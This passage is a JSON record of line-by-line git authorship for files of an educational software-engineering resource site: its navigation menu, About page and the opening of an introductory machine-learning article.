[
  {
    "path": "_markbind/navigation/mainNav.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cspan id\u003d\"toc\"\u003e"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cnavigation\u003e"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "* ****Programming Languages****"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  * C++"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Rvalue References and Move Semantics]({{baseUrl}}/contents/c++/rvalue.html)"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "  * CSharp"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": "\t* [Introduction to CSharp]({{baseUrl}}/contents/csharp/IntroductionToCSharp.html)"
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "le0tan"
        },
        "content": "  * [Dart]({{baseUrl}}/contents/dart/Dart.html)"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "openorclose"
        },
        "content": "  * [Elm]({{baseUrl}}/contents/elm/Elm.html)"
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Go]({{baseUrl}}/contents/go/Go.html)"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Haskell]({{baseUrl}}/contents/haskell/Haskell.html)"
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "  * Java"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Java Concurrency]({{baseUrl}}/contents/java/JavaConcurrency.html)"
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Java Streams]({{baseUrl}}/contents/java/streams-an-introduction.html)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Java Synchronization]({{baseUrl}}/contents/java/JavaSynchronization.html)"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Java Reflection]({{baseUrl}}/contents/java/JavaReflections.html)"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": "    * [JUnit]({{baseUrl}}/contents/java/JUnit.html)"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "  * JavaScript"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Writing Testable JavaScript Code]({{baseUrl}}/contents/javascript/WritingTestableJavascript.html)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Javascript Promises]({{baseUrl}}/contents/javascript/Javascript-promises.html)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Javascript Modules]({{baseUrl}}/contents/javascript/Javascript-modules.html)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Static Typing in JavaScript]({{baseUrl}}/contents/javascript/staticTypingInJavascript.html)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "  * Kotlin"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Introduction to Kotlin]({{baseUrl}}/contents/kotlin/kotlin.html)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Null Safety In Kotlin]({{baseUrl}}/contents/kotlin/NullSafety.html)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "  * Python"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Introduction to Python]({{baseUrl}}/contents/python/introduction-to-python.html)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "    * [NumPy]({{baseUrl}}/contents/python/numpy.html)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Ruby]({{baseUrl}}/contents/ruby/Ruby.html)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Rust]({{baseUrl}}/contents/rust/Rust.html)"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Scala]({{baseUrl}}/contents/scala/Scala.html)"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Swift]({{baseUrl}}/contents/swift/welcome-to-swift.html)"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "* ****SE Topics****"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "  * Architecture"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "    * [REST]({{baseUrl}}/contents/architecture/RESTArchitecturalStyle.html)"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "  * Code Quality"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Code Quality Metrics]({{baseUrl}}/contents/codeQuality/CodeQualityMetrics.html)"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Documentation]({{baseUrl}}/contents/projectManagement/documentation.html)"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Functional Programming]({{baseUrl}}/contents/functionalProgramming/intro.html)"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "  * Performance"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Introduction to Performance Optimization]({{baseUrl}}/contents/performance/Performance.html)"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Performance Profiling]({{baseUrl}}/contents/performance/PerformanceProfiling.html)"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Web Performance]({{baseUrl}}/contents/performance/WebPerformance.html)"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "  * Project Management"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Agile Development]({{baseUrl}}/contents/projectManagement/AgileDevelopment.html)"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "    * [DevOps]({{baseUrl}}/contents/devops/DevOps.html)"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "  * Revision Control"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Best Practices with git]({{baseUrl}}/contents/revisionControl/bestPracticesGit.html)"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Scalability]({{baseUrl}}/contents/scalability/scalable-development.html)"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "  * Static Analysis"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Introduction to Static Analysis]({{baseUrl}}/contents/staticAnalysis/intro.html)"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "    * [CheckStyle]({{baseUrl}}/contents/staticAnalysis/checkStyle.html)"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "    * [PMD]({{baseUrl}}/contents/staticAnalysis/PMD.html)"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "    * [FindBugs]({{baseUrl}}/contents/staticAnalysis/FindBugs.html)"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "    * [ESLint]({{baseUrl}}/contents/staticAnalysis/ESLint.html)"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "  * Testing"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Integration Testing]({{baseUrl}}/contents/testing/integration-testing.html)"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "    * [Security Testing]({{baseUrl}}/contents/testing/security-testing.html)"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Writing Testable Code]({{baseUrl}}/contents/testing/writing-testable-code.html)"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "  * UI/UX"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Accessibility]({{baseUrl}}/contents/uix/accessibility.html)"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Design Systems]({{baseUrl}}/contents/uix/design-systems.html)"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Introduction to UI/UX]({{baseUrl}}/contents/uix/uix.html)"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Refining UX Design Skills]({{baseUrl}}/contents/uix/refining-ux-skills.html)"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "* ****App Frameworks****"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Android]({{baseUrl}}/contents/android/IntroToAndroid.html)"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Angular]({{baseUrl}}/contents/javascript/Javascript-framework-Angular.html)"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "  * [iOS]({{baseUrl}}/contents/ios/IntroToIos.html)"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "  * [Node]({{baseUrl}}/contents/node/nodejs.html)"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "  * [React]({{baseUrl}}/contents/javascript/Javascript-framework-React.html)"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "nbriannl"
        },
        "content": "  * [Redux]({{baseUrl}}/contents/javascript/Javascript-framework-Redux.html)"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Ruby on Rails]({{baseUrl}}/contents/ruby/Rails.html)"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "0blivious"
        },
        "content": "  * [Spring]({{baseUrl}}/contents/java/Spring.html)"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "  * [Vue]({{baseUrl}}/contents/javascript/Javascript-framework-VueJs.html)"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "* ****Tools Useful for Software Engineers****"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Regular Expressions]({{baseUrl}}/contents/regex/Regex.html)"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Docker]({{baseUrl}}/contents/docker/Docker.html)"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  * [Dotfiles]({{baseUrl}}/contents/dotfiles/Dotfiles.html)"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "* ****Other Topics****"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Computer Vision]({{baseUrl}}/contents/computerVision/cv.html)"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "  * Databases"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "    * [DBMS]({{baseUrl}}/contents/data/databases/databases.html)"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "    * [SQL]({{baseUrl}}/contents/data/sql/SQL.html)"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    * [NoSQL]({{baseUrl}}/contents/data/nosql/NoSQL.html)"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Machine Learning]({{baseUrl}}/contents/ai/ml.html)"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "  * Multi-Threading"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "    * [GPGPU]({{baseUrl}}/contents/gpgpu/gpgpu.html)"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "    * [CUDA]({{baseUrl}}/contents/gpgpu/cuda.html)"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "j-lum"
        },
        "content": "  * [Natural Language Processing]({{baseUrl}}/contents/naturalLanguage/nl.html)"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "  * Security"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Cross Site Request Forgery]({{baseUrl}}/contents/security/crossSiteRequestForgery/crossSiteRequestForgery.html)"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Cross Site Scripting]({{baseUrl}}/contents/security/crossSiteScripting/crossSiteScripting.html)"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Cryptography]({{baseUrl}}/contents/security/cryptography.html)"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "    * [HTTPS]({{baseUrl}}/contents/security/Https.html)"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Password Storage]({{baseUrl}}/contents/security/passwordStorage.html)"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "    * [SQL Injection]({{baseUrl}}/contents/security/sqlInjection.html)"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "  * Shell"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "    * [bash]({{baseUrl}}/contents/shells/bash.html)"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/navigation\u003e"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/span\u003e"
      }
    ],
    "authorContributionMap": {
      "openorclose": 1,
      "nbriannl": 1,
      "le0tan": 1,
      "tiuweehan": 1,
      "Tejas2805": 2,
      "madanalogy": 1,
      "j-lum": 1,
      "iskandarzulkarnaien": 1,
      "-": 96,
      "0blivious": 1,
      "ang-zeyu": 1
    }
  },
  {
    "path": "about.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: \"About Us\""
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "# About Us"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "This is a sub-project of the [SE-EDU Project](https://se-edu.github.io)."
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cspan id\u003d\"contact-info\"\u003e"
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": "## Contact"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": "Suggestions, questions, and bug reports can be posted in [our issue tracker](https://github.com/nus-oss/learningresources/issues)."
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Alternatively, contact project mentor [Damith C. Rajapakse](https://www.comp.nus.edu.sg/~damithch)."
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/span\u003e"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "## License"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "MIT"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "## Acknowledgements"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "* The `favicon.ico` is based on an icon made by [Dave Gandy](https://www.flaticon.com/authors/dave-gandy) from www.flaticon.com "
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "jamessspanggg": 1,
      "-": 31
    }
  },
  {
    "path": "contents/ai/ml.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to Machine Learning (ML)"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  pageNav: 4"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to Machine Learning (ML)"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: [Alex Fong](https://github.com/alexfjw)"
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [What is Machine Learning‎](#what-is-machine-learning)"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Types of Machine Learning tasks‎](#types-of-machine-learning-tasks)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Types of Machine Learning Algorithms‎](#types-of-machine-learning-algorithms)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Supervised Learning‎](#supervised-learning)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Unsupervised Learning‎](#unsupervised-learning)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Types of Data‎](#types-of-data)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How Machine Learning is Applied‎](#how-machine-learning-is-applied)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Prototyping Platforms and Tools‎](#prototyping-platforms-and-tools)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Prototyping Workflow‎](#prototyping-workflow)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Basic Data Preprocessing‎](#basic-data-preprocessing)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Partitioning of Data‎](#partitioning-of-data)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Test Set‎](#test-set)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Validation Set‎](#validation-set)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Training Set‎](#training-set)"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Model Training, Evaluation, Data Analysis‎](#model-training-evaluation-data-analysis)"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Production‎](#production)"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Concluding Remarks‎](#concluding-remarks)"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Supplementary Resources‎](#supplementary-resources)"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Footnotes‎](#footnotes)"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## What is Machine Learning?"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "Machine learning is a subfield in artificial intelligence whereby computers learn from data to perform a task. Machine learning is powerful because it can discern complex patterns within data, and utilize them to produce desired outputs. "
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "An example of a task is machine translation, where text is converted from one language to another by a computer. It is difficult to perform machine translation with regular programming, where we have to write clear instructions for the computer. ML alogirthms can be used instead to approximate the ideal instructions with data. In fact, ML algorithms have achieved state of the art performance for machine translation, as seen from the following blogpost on [Google\u0027s machine translation algorithm](https://blog.statsbot.co/machine-learning-translation-96f0ed8f19e4). "
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "The ML algorithms are fed with data to approximate the ideal instructions for performing tasks. These approximations are never 100% correct and there are various parameters to tweak for maximizing performance. Statistical analysis is used to evaluate the performance of different ML algorithm configurations. "
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Types of Machine Learning Tasks"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "Machine learning algorithms perform well for a large variety of tasks, from computer vision to natural language processing. Here is a non-exhaustive list:"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "- Sentiment analysis ([NLTK example on Kaggle](https://www.kaggle.com/ngyptr/python-nltk-sentiment-analysis?scriptVersionId\u003d904608))"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "- Machine translation ([NMT](https://github.com/tensorflow/nmt), by Google)"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "- Image generation ([SuperRes](https://github.com/alexjc/neural-enhance), [Texture Synthesis](http://bethgelab.org/deeptextures/))"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "- Voice recognition, generation ([DeepSpeech](https://github.com/mozilla/DeepSpeech))"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "- Noise suppression ([RNNoise](https://people.xiph.org/~jm/demo/rnnoise/))"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "- Optical Character Recognition ([Tesseract-OCR](https://github.com/tesseract-ocr/tesseract))"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "- Data analytics (identifying trends, predicting sales)"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "- Recommender systems (recommending products based on user profiles)"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "- Instance segmentation (object detection \u0026 recognition to the pixel level [MaskRCNN](https://github.com/matterport/Mask_RCNN)) "
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "- Classification (often used for document indexing and retrieval)"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "Different algorithms and ML pipelines exist for performing the above tasks."
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Types of Machine Learning Algorithms"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "There are two broad categories of ML algorithms, *supervised learning* and *unsupervised learning*. "
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "#### Supervised Learning"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "In supervised learning, the data used for training is accompanied with desired outputs for the task. For the case of machine translation, an example input is a sentence in the source language. The desired output is the corresponding sentence in the target language.   "
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": " "
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "Learning is \u0027supervised\u0027 as the algorithm is told whether it has made a correct prediction."
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "Consequently, all training data must be labelled, and the labelling process may be costly."
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "Platforms like [Amazon Mechanical Turk](https://www.mturk.com/) are used for manual labelling of data.  "
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "One simple use case is image classification, to match the input image to a known label."
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"https://i.imgur.com/mKjIS0C.png\" width\u003d\"450\"\u003e\u003cbr/\u003e"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
